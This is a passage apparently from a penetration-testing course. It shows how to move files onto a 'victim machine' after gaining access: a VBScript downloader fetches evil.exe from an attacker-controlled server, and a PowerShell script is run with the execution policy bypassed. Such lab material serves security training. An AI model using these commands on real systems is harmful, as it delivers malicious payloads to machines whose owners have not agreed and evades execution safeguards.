Now, we can serve files on our own web server, and download them to the victim
machine with ease:
C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe




Now, we can use PowerShell to run the script and download our file:
C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
NoProfile -File wget.ps1
